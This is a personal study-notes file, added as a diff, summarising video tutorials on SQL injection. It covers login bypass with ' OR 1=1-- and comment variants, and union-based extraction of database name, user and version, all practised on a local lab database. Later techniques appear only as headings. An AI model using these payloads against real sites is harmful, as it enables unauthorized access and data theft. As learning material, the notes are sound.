@@ -1,0 +1,257 @@
+
+Edureka:
+
+1. https://www.youtube.com/watch?v=3Axp3VDnf0I
+
+ i)   What is SQLi ?
+ ii)  How SQLi works ?
+ iii) How to use SQLi attack ?
+ iv) How to prevent SQLi ?
+
+
+
+ i) Fetching information from database to return back to the web application.
+    
+    SQLi is a code injection technique used to execute malicious SQL statement.
+    
+ ii) Login:
+     +------------------------+
+     |          +----------+  | 
+     | Username | reveng            
+     |          +----------+  |___________________________
+     |          +----------+  |                          | 
+     | Password | 1234                                   |
+     |          +----------+  |                          |
+     +------------------------+                          | 
+                 |                                   ____|______
+                 |   				                 |---------|
+                 |                                   |---------|
+                 V                                   |---------| DAtabase
+            SELECT * from users                      |---------|
+            WHERE username='reveng'                  |_________|
+            and                                          |
+            password='1234'                              |
+            |_________________________|                  V
+                      |                              +--------+----+
+                      V                              |        |    |              
+           In this case, it returns true value.      | reveng |1234|
+ 		                  |				             |--------|----|
+		                  V		                     | user   |abcd|
+     	                True  		                 ......... ... . 
+                                                     .        .    .
+              If this query returns,--> False        .        .    .	
+   					 |
+ 					 V
+         That means those credentials were not present, we can't login.
+
+
+SQLi ---> we don't have credentials to login but then also we can login.
+
+ OR logic:
+_______________
+False | False |----> False
+False | True  |----> True
+True  | False |----> True
+True  | True  |----> True
+
+ ===> Whenever one input is true, Result/output will be TRUE
+
+-------------------------+
+SELECT * from users      |
+WHERE username='reveng'  |
+and                      |
+password='1234'          | 
+-------------------------+
+          |
+          | We will manipulate this query
+          |
+          V
+SELECT * from users
+WHERE
+username='' OR 1=1--'
+and
+password='1234'
+
+* 1st ' gets closed by 2nd '
+
+*  --   ----->  It is used to comment like in C --> // and /* */ , in bash --> # 
+
+see: https://security.stackexchange.com/questions/196169/why-should-we-sometimes-use-instead-of-in-sql-injection-to-comment-the-re
+
+as, 1=1 => True ----> we can login.
+
+
+ 
+ iii) GET method ---> Data is sent in the URL of the request
+
+      eg: http://localhost/sql/login.php?username=admin&password=admin
+
+      POST method --> Data is not sent in the URL of the request
+
+      eg: http://localhost/sql/login.php
+
+
+ iv) PREVENTION: Actually depends on how the webapp is built.
+
+
+2. https://www.youtube.com/watch?v=2nXOxLpeu80
+
+	Download Xampp ---> Win10 
+
+	turn on ---> apache and mysql  From xampp control panel
+
+
+	open ---> localhost/setup.php
+
+	          testphp.vulnweb.com
+
+
+
+In mysql console,
+
+mysql> select user();
+
+
+mysql> select version();
+
+
+mysql> select database();
+
+   ^
+   |
+   |--- USEFUL for understnading the specification
+
+
+_____________________________________________________
+
+DB : sbva
+
+tablename : login
+
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    1 | sagar    | bansal   |
+|    2 | reveng   | biswas   |
++------+----------+----------+
+
+
+
+Type 1:
+
+SELECT * FROM login where username="admin" or 1=1 and password="admin" or 1=1;
+
+
+SOMETIME, WE MAY ENCOUNTER THAT "" (double quotes) DON'T WORK AS WE CAN USE CAN BOTH '(single quote) AND "(double quote). IT's THE CHOICE OF THE DEVELOPER WHAT THEY WILL USE.
+
+
+SO IF "(double quotes) doesn't work, then use '(single quote).
+
+
+Type 2:
+
+Using comments ------> # or -- or -- - or /*  */
+
+There are many way to comment, we have to try all of them...
+
+
+SELECT * FROM login where username="admin" or "1"="1;#" and password="admin" or "1"="1";
+
+OR,
+
+SELECT * FROM login where username="admin" or "1"="1;
+
+OR,
+
+SELECT * FROM login where username="admin" or "1"="1;--" and password="admin" or "1"="1";
+
+OR,
+
+SELECT * FROM login where username="admin" or "1"="1;/*" and password="admin" or "1"="1";*/
+
+
+
+	See: OWASP top 10 copy...
+
+
+
+-----> Union Based Injection:
+
+
+select * from login union select 1,2,3;
+
+
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    1 | sagar    | bansal   |
+|    2 | reveng   | biswas   |
+|    1 | 2        | 3        |
++------+----------+----------+
+
+
+select * from login union select database(), user(), version();
+
+
++------+----------------+-------------------+
+| id   | username       | password          |
++------+----------------+-------------------+
+| 1    | sagar          | bansal            |
+| 2    | reveng         | biswas            |
+| sbva | root@localhost | 10.3.24-MariaDB-2 |
++------+----------------+-------------------+
+
+
+
+select * from login union select database(), user();
+
+
+ERROR 1222 (21000): The used SELECT statements have a different number of columns
+
+
+
+select * from login union select database(), user(), version(), 4;
+
+
+ERROR 1222 (21000): The used SELECT statements have a different number of columns
+
+
+We have to give:
+
+same number of columns as present in that table of the database, or else it will give error.
+
+see: 33:10
+
+Just copy paste this portion, " union select database(), user(), version(); "
+
+
+
+
+KNOWING THE EXACT NUMBER OF COLUMNS are a bit tricky...
+
+
+WE have to brute force it...
+
+
+
+-----> Error Based Injection:
+
+
+see: 42:08
+
+
+------> Boolean Based Blind sql injection
+
+see :
+
+
+-------> Time Based SQL injection
+
+
+see: 
+
+
+-------> Semi automated tool
+
+
+see: 
